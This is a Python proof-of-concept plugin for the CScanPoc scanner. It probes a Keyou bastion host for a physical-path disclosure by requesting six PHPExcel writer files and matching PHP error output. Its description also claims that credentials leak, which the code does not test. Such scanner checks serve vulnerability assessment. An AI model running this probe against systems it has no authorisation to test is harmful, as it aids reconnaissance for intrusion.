# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'Keyou_0006' # 平台漏洞编号，留空
    name = '江南科友堡垒机 爆物理路径' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = ''  # 漏洞公布时间
    desc = '''
        江南科友堡垒机直接获取主机账密/IP/暴漏物理路径:
        '/excel/Spreadsheet/Excel/Writer.php',
        '/excel/Spreadsheet/Excel/Writer/Format.php',
        '/excel/Spreadsheet/Excel/Writer/Parser.php',
        '/excel/Spreadsheet/Excel/Writer/BIFFwriter.php',
        '/excel/Spreadsheet/Excel/Writer/Workbook.php',
        '/excel/Spreadsheet/Excel/Writer/Worksheet.php'
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0135704
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '江南科友堡垒机'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75a3835a-9ffc-41cd-b50a-4a55c3b33df8'
    author = '国光'  # POC编写者
    create_date = '2018-05-15' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = [
                '/excel/Spreadsheet/Excel/Writer.php',
                '/excel/Spreadsheet/Excel/Writer/Format.php',
                '/excel/Spreadsheet/Excel/Writer/Parser.php',
                '/excel/Spreadsheet/Excel/Writer/BIFFwriter.php',
                '/excel/Spreadsheet/Excel/Writer/Workbook.php',
                '/excel/Spreadsheet/Excel/Writer/Worksheet.php']
            for payload in payloads:
                url = arg + payload
                code, head, res, errorcode, _ = hh.http(url)
                if code == 200:
                    m = re.search(
                        'No such file or directory in <b>([^<]+)</b> on line <b>(\d+)</b>', res)
                    if m:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()